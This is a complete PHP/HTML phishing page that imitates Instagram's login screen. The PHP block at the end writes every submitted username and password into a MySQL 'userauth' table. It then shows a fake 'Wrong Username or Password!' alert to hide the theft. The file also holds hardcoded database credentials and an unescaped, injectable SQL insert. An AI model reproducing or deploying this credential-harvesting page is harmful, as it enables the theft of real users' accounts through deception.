<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

<style>
* {
  box-sizing: border-box;
}

input[type=text], select, textarea {
  width: 130%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 5px;
  resize: vertical;
    height: 100px;
    font-size: 35px;
}
    input[type=password], select, textarea {
  width: 130%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 5px;
  resize: vertical;
    height: 100px;
    font-size: 35px;
}

label {
  padding: 12px 12px 12px 0;
  display: inline-block;
}
   button {
  background-color: #3578E5;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
        margin-left:-15px;
        margin-top:29px;
  border: none;
  cursor: pointer;
  width: 96%;
        margin-left: 30px;
        height: 85px;
        border-radius: 5px;
        font-size: 38px;
}

input[type=submit] {
  background-color: #4CAF50;
  color: white;
  padding: 12px 20px;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  float: right;
}

input[type=submit]:hover {
  background-color: #45a049;
}

.container {
  border-radius: 2px;
 
  padding: 26px;
    width:89%;
    
    margin-left: 40px;
}

.col-25 {
  float: left;
  width: 25%;
  margin-top: 0px;
}

.col-75 {
  float: left;
  width: 80%;
  margin-top: 0px;
}

/* Clear floats after the columns */
.row:after {
  content: "";
  display: table;
  clear: both;
}

/* Responsive layout - when the screen is less than 600px wide, make the two columns stack on top of each other instead of next to each other */
@media screen and (max-width: 600px) {
  .col-25, .col-75, input[type=submit] {
    width: 100%;
    margin-top: 0;
  }
}
</style>
</head>
<body>
   <form action="" method="post">
      
      <div class="_4g33 _52we _52z5" id="header">
       <div style="background-color:#fff;height:110px;" class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">
           
             <img src="insta.PNG" style="height:160px;margin-left:220px;margin-top:50px" alt="">
           
       </div>
       

       
       
       
       
       </div>
       
      <div style="background-color:#fff;height:750px;margin-top:100px;"> 
       <div class="container">
  
    <div class="row">
     
      <div class="col-75">
        <input  style="width:115%;margin-left:50px;margin-bottom:17px;" type="text" id="fname" name="firstname" placeholder="Phone number,username,or email">
      </div>
    </div>
    <div class="row">
      
      <div class="col-75">
        <input style="width:115%;margin-left:50px;" type="password" id="lname" name="lastname" placeholder="Password">
      </div>
    </div>
      
     
       <button type="submit" name="Submit">Log in</button>
      
       </div>
       
       
       <img src="instafake2.PNG" alt="" style="width:100%;">
       
       
       </div>
       
       
      
       
      
    </form>  
    
</body>


<!-- style="background-color:#4267B2;" -->
</html>


<?php

if(isset($_POST["Submit"])){

  $servername = "localhost";
        $username = "peacffkx_Farhan";
        $password = "BSFoXvRlRnyz";
        $db = "peacffkx_login";
        
        
        $conn = mysqli_connect("$servername","$username","$password","$db");
   
    
    if(!$conn)
    {
         die("Connection failed: " . mysqli_connect_error());
    }
    else{
    
    
    
     mysqli_query($conn,"insert into userauth (username,password) values ('$_POST[firstname]','$_POST[lastname]')") or die(mysqli_error($conn));
    
     ?>
           
                 <script type="text/javascript">
                     
                     alert("Wrong Username or Password!");
                    </script>
                  
        <?php
        
        
        
    
    }
}

?>
